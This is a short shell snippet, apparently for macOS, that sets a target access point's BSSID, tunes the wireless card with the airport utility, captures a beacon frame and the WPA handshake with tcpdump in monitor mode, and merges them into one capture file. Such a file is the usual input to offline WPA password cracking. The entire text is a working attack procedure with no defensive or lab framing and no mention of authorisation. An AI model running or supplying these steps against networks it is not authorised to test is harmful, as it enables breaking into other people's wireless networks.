export BSSID=54:99:63:ba:ed:30
# disassociate
sudo airport -z
# set the channel
# DO NOT PUT SPACE BETWEEN -c and the channel
# for example sudo airport -c6
sudo airport -c[CHANNEL]
# capture a beacon frame from the AP
sudo tcpdump "type mgt subtype beacon and ether src $BSSID" -I -c 1 -i en0 -w beacon.cap
# wait for the WPA handshake
sudo tcpdump "ether proto 0x888e and ether host $BSSID" -I -U -vvv -i en0 -w handshake.cap
# merge the two files
mergecap -a -F pcap -w capture.cap beacon.cap handshake.cap
